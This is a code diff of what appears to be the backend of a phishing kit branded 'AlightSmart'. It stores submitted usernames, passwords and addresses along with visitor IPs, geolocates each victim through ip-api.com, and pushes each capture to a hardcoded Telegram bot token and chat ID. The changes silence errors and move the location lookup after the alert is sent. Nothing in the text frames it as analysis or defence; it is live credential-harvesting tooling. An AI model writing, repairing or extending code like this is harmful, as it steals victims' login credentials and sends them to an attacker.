@@ -33,29 +33,16 @@ function getRealIP(req) {
            'Unknown';
 }
 
-// Telegram Config
+// Telegram
 const TELEGRAM_TOKEN = "8884240723:AAFfSTKd9jab0Xdfp-L-mPSeJqyyISe8LaU";
 const CHAT_ID = "8559945003";
-
-async function getLocation(ip) {
-    if (!ip || ip === 'Unknown') return 'Unknown Location';
-    try {
-        const res = await fetch(`http://ip-api.com/json/${ip}?fields=city,country`, { timeout: 5000 });
-        const data = await res.json();
-        if (data.city || data.country) {
-            return `${data.city || ''}, ${data.country || ''}`.trim() || 'Unknown Location';
-        }
-    } catch (e) {}
-    return 'Unknown Location';
-}
 
 async function sendTelegramNotification(record) {
     const message = `🚨🔴 *NEW LINK CLICK - AlightSmart!*\n\n` +
         `• *Type:* ${record.type}\n` +
-        `• *Username:* ${record.username || 'Visitor'}\n` +
         `• *Details:* ${record.address || '-'}\n` +
         `• *IP:* ${record.ip}\n` +
-        `• *Location:* ${record.location || 'Unknown Location'}\n` +
+        `• *Location:* ${record.location || 'Detecting...'}\n` +
         `• *Time:* ${record.timestamp}\n\n` +
         `🕒 ${new Date().toLocaleString()}`;
 
@@ -69,28 +56,33 @@ async function sendTelegramNotification(record) {
                 parse_mode: 'Markdown'
             })
         });
-    } catch (err) {
-        console.error("Telegram failed:", err.message);
-    }
+    } catch (err) {}
 }
 
 async function saveRecord(type, username = null, password = null, address = null, ip = 'Unknown') {
     const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' });
-    const location = await getLocation(ip);
-
+    
+    // Save to database first
     try {
         await pool.query(
             "INSERT INTO records (type, username, password, address, ip, location, timestamp) VALUES ($1, $2, $3, $4, $5, $6, $7)",
-            [type, username, password, address, ip, location, timestamp]
+            [type, username, password, address, ip, 'Detecting...', timestamp]
         );
+    } catch (e) {}
 
-        console.log(`✅ SAVED: ${type} | Location: ${location}`);
+    // Send notification immediately
+    await sendTelegramNotification({ type, username, password, address, ip, location: 'Detecting...', timestamp });
 
-        // Immediate notification
-        await sendTelegramNotification({ type, username, password, address, ip, location, timestamp });
-
-    } catch (err) {
-        console.error("Save Error:", err.message);
+    // Update location in background
+    if (ip !== 'Unknown') {
+        try {
+            const res = await fetch(`http://ip-api.com/json/${ip}?fields=city,country`, { timeout: 4000 });
+            const data = await res.json();
+            if (data.city || data.country) {
+                const location = `${data.city || ''}, ${data.country || ''}`.trim();
+                await pool.query("UPDATE records SET location = $1 WHERE timestamp = $2", [location, timestamp]);
+            }
+        } catch (e) {}
     }
 }
 
@@ -114,6 +106,7 @@ app.post('/api/login', async (req, res) => {
     res.json({ success: true });
 });
 
+// Other routes (admin, confirm, delete, clear) remain the same...
 app.get('/api/records', async (req, res) => {
     try {
         const result = await pool.query("SELECT * FROM records ORDER BY id DESC");
